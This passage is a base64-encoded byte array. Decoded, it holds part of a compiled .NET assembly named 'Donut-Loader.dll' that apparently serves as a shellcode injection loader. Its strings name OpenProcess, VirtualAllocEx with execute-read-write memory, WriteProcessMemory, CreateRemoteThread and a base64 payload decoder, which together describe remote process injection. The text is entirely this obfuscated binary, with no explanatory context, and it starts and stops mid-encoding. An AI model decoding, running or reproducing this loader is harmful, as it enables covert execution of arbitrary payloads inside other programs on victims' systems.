sIDAsIDEyMywgMCwgOTAsIDEsIDE2OSwgMCwgMTk3LCAwLCAyMTQsIDAsIDIyMywgNCwgMjM2LCA0LCAwLCAxLCA1LCAwLCAyNTIsIDAsIDEsIDAsIDYsIDEsIDcsIDAsIDgsIDEsIDEsIDAsIDY3LCAxLCA5LCAwLCAyNCwgMSwgMiwgMCwgNjUsIDEsIDExLCAwLCAzOSwgMSwgMSwgMCwgNjQsIDEsIDEzLCAwLCA1NCwgMSwgMSwgMCwgMCwgMSwgMTUsIDAsIDczLCAxLCAxLCAwLCAwLCAxLCAxOSwgMCwgOTksIDEsIDEsIDAsIDQsIDEyOCwgMCwgMCwgMSwgMCwgMCwgMCwgMzksIDI4LCAyOCwgODAsIDAsIDAsIDAsIDAsIDAsIDAsIDE3NSwgNCwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgNDksIDAsIDAsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDU4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2MCwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA2MiwgMCwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCA0NiwgMTAwLCAxMDgsIDEwOCwgMCwgODAsIDExNCwgMTExLCAxMDMsIDExNCwgOTcsIDEwOSwgMCwgODMsIDEwNCwgMTAxLCAxMDgsIDEwOCwgOTksIDExMSwgMTAwLCAxMDEsIDg0LCAxMDEsIDExNSwgMTE2LCAwLCAxMDksIDExNSwgOTksIDExMSwgMTE0LCAxMDgsIDEwNSwgOTgsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgMCwgNzksIDk4LCAxMDYsIDEwMSwgOTksIDExNiwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA2NywgODIsIDY5LCA2NSwgODQsIDY5LCA5NSwgODQsIDcyLCA4MiwgNjksIDY1LCA2OCwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4MSwgODUsIDY5LCA4MiwgODksIDk1LCA3MywgNzgsIDcwLCA3OSwgODIsIDc3LCA2NSwgODQsIDczLCA3OSwgNzgsIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODYsIDc3LCA5NSwgNzksIDgwLCA2OSwgODIsIDY1LCA4NCwgNzMsIDc5LCA3OCwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4NiwgNzcsIDk1LCA4NywgODIsIDczLCA4NCwgNjksIDAsIDgwLCA4MiwgNzksIDY3LCA2OSwgODMsIDgzLCA5NSwgODYsIDc3LCA5NSwgODIsIDY5LCA2NSwgNjgsIDAsIDc3LCA2OSwgNzcsIDk1LCA2NywgNzksIDc3LCA3NywgNzMsIDg0LCAwLCA3NywgNjksIDc3LCA5NSwgODIsIDY5LCA4MywgNjksIDgyLCA4NiwgNjksIDAsIDgwLCA2NSwgNzEsIDY5LCA5NSwgODIsIDY5LCA2NSwgNjgsIDg3LCA4MiwgNzMsIDg0LCA2OSwgMCwgODAsIDY1LCA3MSwgNjksIDk1LCA2OSwgODgsIDY5LCA2NywgODUsIDg0LCA2OSwgOTUsIDgyLCA2OSwgNjUsIDY4LCA4NywgODIsIDczLCA4NCwgNjksIDAsIDEyMCwgNTQsIDUyLCAwLCAxMjAsIDU2LCA1NCwgMCwgMTEyLCAxMDUsIDEwMCwgMCwgNzcsIDk3LCAxMDUsIDExMCwgMCwgNzksIDExMiwgMTAxLCAxMTAsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDcxLCAxMDEsIDExNiwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA3MiwgOTcsIDExMCwgMTAwLCAxMDgsIDEwMSwgMCwgNzEsIDEwMSwgMTE2LCA4MCwgMTE0LCAxMTEsIDk5LCA2NSwgMTAwLCAxMDAsIDExNCwgMTAxLCAxMTUsIDExNSwgMCwgODYsIDEwNSwgMTE0LCAxMTYsIDExNywgOTcsIDEwOCwgNjUsIDEwOCwgMTA4LCAxMTEsIDk5LCA2OSwgMTIwLCAwLCA4NywgMTE0LCAxMDUsIDExNiwgMTAxLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCA3NywgMTAxLCAxMDksIDExMSwgMTE0LCAxMjEsIDAsIDY3LCAxMTQsIDEwMSwgOTcsIDExNiwgMTAxLCA4MiwgMTAxLCAxMDksIDExMSwgMTE2LCAxMDEsIDg0LCAxMDQsIDExNCwgMTAxLCA5NywgMTAwLCAwLCA3MywgMTEwLCAxMDYsIDEwMSwgOTksIDExNiwgMCwgNzMsIDExNSwgODcsIDExMSwgMTE5LCA1NCwgNTIsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDY4LCAxMDUsIDk3LCAxMDMsIDExMCwgMTExLCAxMTUsIDExNiwgMTA1LCA5OSwgMTE1LCAwLCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA0NiwgOTksIDExNiwgMTExLCAxMTQsIDAsIDk3LCAxMTQsIDEwMywgMTE1LCAwLCAxMDAsIDExOSwgNjgsIDEwMSwgMTE1LCAxMDUsIDExNCwgMTAxLCAxMDAsIDY1LCA5OSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDk4LCA3MywgMTEwLCAxMDQsIDEwMSwgMTE0LCAxMDUsIDExNiwgNzIsIDk3LCAxMTAsIDEwMCwgMTA4LCAxMDEsIDAsIDEwMCwgMTE5LCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCA3MywgMTAwLCAwLCAxMDgsIDExMiwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxMDQsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgMCwgMTEyLCAxMTQsIDExMSwgOTksIDc4LCA5NywgMTA5LCAxMDEsIDAsIDEwNCwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgMTA4LCAxMTIsIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCAxMDAsIDExOSwgODMsIDEwNSwgMTIyLCAxMDEsIDAsIDEwMiwgMTA4LCA2NSwgMTA4LCAxMDgsIDExMSwgOTksIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDg0LCAxMjEsIDExMiwgMTAxLCAwLCAxMDIsIDEwOCwgODAsIDExNCwgMTExLCAxMTYsIDEwMSwgOTksIDExNiwgMCwgMTA4LCAxMTIsIDY2LCA5NywgMTE1LCAxMDEsIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCAxMDgsIDExMiwgNjYsIDExNywgMTAyLCAxMDIsIDEwMSwgMTE0LCAwLCAxMTAsIDgzLCAxMDUsIDEyMiwgMTAxLCAwLCAxMDgsIDExMiwgNzgsIDExNywgMTA5LCA5OCwgMTAxLCAxMTQsIDc5LCAxMDIsIDY2LCAxMjEsIDExNiwgMTAxLCAxMTUsIDg3LCAxMTQsIDEwNSwgMTE2LCAxMTYsIDEwMSwgMTEwLCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDczLCAxMTAsIDExNiwgMTAxLCAxMTQsIDExMSwgMTEyLCA4MywgMTAxLCAxMTQsIDExOCwgMTA1LCA5OSwgMTAxLCAxMTUsIDAsIDc5LCAxMTcsIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDEwOCwgMTEyLCA4NCwgMTA0LCAxMTQsIDEwMSwgOTcsIDEwMCwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDExNSwgMCwgMTAwLCAxMTksIDgzLCAxMTYsIDk3LCA5OSwgMTA3LCA4MywgMTA1LCAxMjIsIDEwMSwgMCwgMTA4LCAxMTIsIDgzLCAxMTYsIDk3LCAxMTQsIDExNiwgNjUsIDEwMCwgMTAwLCAxMTQsIDEwMSwgMTE1LCAxMTUsIDAsIDEwOCwgMTEyLCA4MCwgOTcsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTYsIDEwMSwgMTE0LCAwLCAxMDAsIDExOSwgNjcsIDExNCwgMTAxLCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA3MCwgMTA4LCA5NywgMTAzLCAxMTUsIDAsIDEwOCwgMTEyLCA4NCwgMTA0LCAxMTQsIDEwMSwgOTcsIDEwMCwgNzMsIDEwMCwgMCwgMTEyLCAxMTQsIDExMSwgOTksIDgwLCA3MywgNjgsIDAsIDEwOCwgMTEyLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDczLCAxMTAsIDEwMiwgMTExLCAwLCAxMTIsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA4NiwgMTAxLCAxMTQsIDExNSwgMTA1LCAxMTEsIDExMCwgMTA1LCAxMTAsIDEwMywgMCwgODQsIDk3LCAxMTQsIDEwMywgMTAxLCAxMTYsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDEwMSwgMTAyLCAxMDgsIDEwMSwgOTksIDExNiwgMTA1LCAxMTEsIDExMCwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4NCwgMTA1LCAxMTYsIDEwOCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2OCwgMTAxLCAxMTUsIDk5LCAxMTQsIDEwNSwgMTEyLCAxMTYsIDEwNSwgMTExLCAxMTAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDExMCwgMTAyLCAxMDUsIDEwMywgMTE3LCAxMTQsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDEwOSwgMTEyLCA5NywgMTEwLCAxMjEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDgwLCAxMTQsIDExMSwgMTAwLCAxMTcsIDk5LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTEsIDExMiwgMTIxLCAxMTQsIDEwNSwgMTAzLCAxMDQsIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODQsIDExNCwgOTcsIDEwMCwgMTAxLCAxMDksIDk3LCAxMTQsIDEwNywgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjcsIDExNywgMTA4LCAxMTYsIDExNywgMTE0LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NywgMTExLCAxMDksIDg2LCAxMDUsIDExNSwgMTA1LCA5OCwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDEwMSwgOTgsIDExNywgMTAzLCAxMDMsIDk3LCA5OCwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2OCwgMTAxLCA5OCwgMTE3LCAxMDMsIDEwMywgMTA1LCAxMTAsIDEwMywgNzcsIDExMSwgMTAwLCAxMDEsIDExNSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA2NywgMTExLCAxMDksIDExMiwgMTA1LCAxMDgsIDEwMSwgMTE0LCA4MywgMTAxLCAxMTQsIDExOCwgMTA1LCA5OSwgMTAxLCAxMTUsIDAsIDY3LCAxMTEsIDEwOSwgMTEyLCAxMDUsIDEwOCwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgODIsIDEwMSwgMTA4LCA5NywgMTIwLCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCAxMTUsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNjcsIDExMSwgMTA5LCAxMTIsIDk3LCAxMTYsIDEwNSwgOTgsIDEwNSwgMTA4LCAxMDUsIDExNiwgMTIxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCAwLCA2NywgMTExLCAxMTAsIDExOCwgMTAxLCAxMTQsIDExNiwgMCwgODQsIDExMSwgNzMsIDExMCwgMTE2LCA1MSwgNTAsIDAsIDY4LCAxMDgsIDEwOCwgNzMsIDEwOSwgMTEyLCAxMTEsIDExNCwgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgMTA3LCAxMDEsIDExNCwgMTEwLCAxMDEsIDEwOCwgNTEsIDUwLCA0NiwgMTAwLCAxMDgsIDEwOCwgMCwgMTA3LCAxMDEsIDExNCwgMTEwLCAxMDEsIDEwOCwgNTEsIDUwLCAwLCA3MSwgMTAxLCAxMTYsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDY2LCAxMjEsIDczLCAxMDAsIDAsIDEwMywgMTAxLCAxMTYsIDk1LCA3MywgMTAwLCAwLCA2NywgMTExLCAxMTAsIDExNSwgMTExLCAxMDgsIDEwMSwgMCwgODcsIDExNCwgMTA1LCAxMTYsIDEwMSwgNzYsIDEwNSwgMTEwLCAxMDEsIDAsIDcwLCAxMTQsIDExMSwgMTA5LCA2NiwgOTcsIDExNSwgMTAxLCA1NCwgNTIsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgMCwgNzMsIDExMCwgMTE2LCA4MCwgMTE2LCAxMTQsIDAsIDkwLCAxMDEsIDExNCwgMTExLCAwLCAxMDMsIDEwMSwgMTE2LCA5NSwgNzIsIDk3LCAxMTAsIDEwMCwgMTA4LCAxMDEsIDAsIDQ2LCA5OSwgOTksIDExNiwgMTExLCAxMTQsIDAsIDcxLCAxMDEsIDExNiwgNjcsIDExNywgMTE0LCAxMTQsIDEwMSwgMTEwLCAxMTYsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDUzLCAxODAsIDE1MSwgNTgsIDEwNiwgNDYsIDEyLCA3NCwgMTQ4LCAxMzAsIDYsIDE0LCAxODAsIDQ4LCA2MywgMjMwLCAwLCA4LCAxODMsIDEyMiwgOTIsIDg2LCAyNSwgNTIsIDIyNCwgMTM3LCAyLCA2LCA4LCA0LCAyLCAwLCAwLCAwLCA0LCAwLCA0LCAwLCAwLCA0LCA4LCAwLCAwLCAwLCA0LCAzMiwgMCwgMCwgMCwgNCwgMTYsIDAsIDAsIDAsIDIsIDYsIDksIDQsIDAsIDE2LCAwLCAwLCA0LCAwLCAzMiwgMCwgMCwgNCwgNCwgMCwgMCwgMCwgNCwgNjQsIDAsIDAsIDAsIDIsIDYsIDE0LCA1LCAwLCAxLCAxLCAyOSwgMTQsIDYsIDAsIDMsIDI0LCA4LCAyLCA4LCA0LCAwLCAxLCAyNCwgMTQsIDUsIDAsIDIsIDI0LCAyNCwgMTQsIDgsIDAsIDUsIDI0LCAyNCwgMjQsIDksIDksIDksIDEwLCAwLCA1LCAyLCAyNCwgMjQsIDI5LCA1LCA5LCAxNiwgMjUsIDEwLCAwLCA3LCAyNCwgMjQsIDI0LCA5LCAyNCwgMjQsIDksIDI0LCA2LCAwLCAzLCA4LCAxNCwgMTQsIDgsIDYsIDAsIDIsIDIsIDI0LCAxNiwgMiwgNSwgMCwgMSwgMiwgMTgsIDksIDMsIDMyLCAwLCAxLCA0LCAzMiwgMSwgMSwgMTQsIDQsIDMyLCAxLCAxLCAyLCA1LCAzMiwgMSwgMSwgMTcsIDY1LCA0LCAzMiwgMSwgMSwgOCwgNCwgMCwgMSwgOCwgMTQsIDMsIDcsIDEsIDIsIDUsIDAsIDEsIDE4LCA5LCA4LCAzLCAzMiwgMCwgOCwgNCwgMCwgMSwgMSwgOCwgNSwgMCwgMSwgMjksIDUsIDE0LCAyLCA2LCAyNCwgMTIsIDcsIDgsIDE4LCA5LCAxNCwgMjksIDUsIDI0LCAyNCwgMjUsIDgsIDIsIDMsIDMyLCAwLCAyNCwgNCwgNywgMiwgMiwgMiwgMywgMCwgMCwgMSwgNCwgMCwgMCwgMTgsIDksIDU1LCAxLCAwLCAyNiwgNDYsIDc4LCA2OSwgODQsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA0NCwgODYsIDEwMSwgMTE0LCAxMTUsIDEwNSwgMTExLCAxMTAsIDYxLCAxMTgsIDUyLCA0NiwgNTMsIDEsIDAsIDg0LCAxNCwgMjAsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA2OCwgMTA1LCAxMTUsIDExMiwgMTA4LCA5NywgMTIxLCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxNywgMSwgMCwgMTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgMCwgMCwgNSwgMSwgMCwgMCwgMCwgMCwgMTksIDEsIDAsIDE0LCA2NywgMTExLCAxMTIsIDEyMSwgMTE0LCAxMDUsIDEwMywgMTA0LCAxMTYsIDMyLCA1MCwgNDgsIDQ5LCA1NywgMCwgMCwgOCwgMSwgMCwgNywgMSwgMCwgMCwgMCwgMCwgOCwgMSwgMCwgOCwgMCwgMCwgMCwgMCwgMCwgMzAsIDEsIDAsIDEsIDAsIDg0LCAyLCAyMiwgODcsIDExNCwgOTcsIDExMiwgNzgsIDExMSwgMTEwLCA2OSwgMTIwLCA5OSwgMTAxLCAxMTIsIDExNiwgMTA1LCAxMTEsIDExMCwgODQsIDEwNCwgMTE0LCAxMTEsIDExOSwgMTE1LCAxLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0MSwgNjQsIDEzOSwgOTMsIDAsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDI4LCAxLCAwLCAwLCA0OCwgNDUsIDAsIDAsIDQ4LCAyOSwgMCwgMCwgODIsIDgzLCA2OCwgODMsIDY2LCAzMywgMjAzLCAyMTYsIDE4NCwgNDQsIDE5LCA3MywgMTczLCAxMjcsIDEwNywgMjE3LCAxMDcsIDIxMiwgMTY1LCAyMzksIDMsIDAsIDAsIDAsIDk5LCA1OCwgOTIsIDg1LCAxMTUsIDEwMSwgMTE0LCAxMTUsIDkyLCAxMTMsIDUyLCA1NiwgNTcsIDUwLCA1MywgNDgsIDQ5LCA1NiwgOTIsIDY4LCAxMTEsIDk5LCAxMTcsIDEwOSwgMTAxLCAxMTAsIDExNiwgMTE1LCA5MiwgODMsIDEwNCwgOTcsIDExNCwgMTEyLCA2OCwgMTAxLCAxMTgsIDEwMSwgMTA4LCAxMTEsIDExMiwgMzIsIDgwLCAxMTQsIDExMSwgMTA2LCAxMDEsIDk5LCAxMTYsIDExNSwgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgOTIsIDExMSwgOTgsIDEwNiwgOTIsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgOTIsIDY4LCAxMTEsIDExMCwgMTE3LCAxMTYsIDQ1LCA3NiwgMTExLCA5NywgMTAwLCAxMDEsIDExNCwgNDYsIDExMiwgMTAwLCA5OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMTYsIDAsIDAsIDAsIDI0LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDEsIDAsIDAsIDAsIDQ4LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCA4OCwgNjQsIDAsIDAsIDI1MiwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjUyLCAyLCA1MiwgMCwgMCwgMCwgODYsIDAsIDgzLCAwLCA5NSwgMCwgODYsIDAsIDY5LCAwLCA4MiwgMCwgODMsIDAsIDczLCAwLCA3OSwgMCwgNzgsIDAsIDk1LCAwLCA3MywgMCwgNzgsIDAsIDcwLCAwLCA3OSwgMCwgMCwgMCwgMCwgMCwgMTg5LCA0LCAyMzksIDI1NCwgMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgMjgsIDgwLCAzOSwgMjgsIDAsIDAsIDEsIDAsIDI4LCA4MCwgMzksIDI4LCA2MywgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjgsIDAsIDAsIDAsIDEsIDAsIDg2LCAwLCA5NywgMCwgMTE0LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNzMsIDAsIDExMCwgMCwgMTAyLCAwLCAxMTEsIDAsIDAsIDAsIDAsIDAsIDM2LCAwLCA0LCAwLCAwLCAwLCA4NCwgMCwgMTE0LCAwLCA5NywgMCwgMTEwLCAwLCAxMTUsIDAsIDEwOCwgMCwgOTcsIDAsIDExNiwgMCwgMTA1LCAwLCAxMTEsIDAsIDExMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTc2LCA0LCA5MiwgMiwgMCwgMCwgMSwgMCwgODMsIDAsIDExNiwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMCwgMCwgMTAzLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNzMsIDAsIDExMCwgMCwgMTAyLCAwLCAxMTEsIDAsIDAsID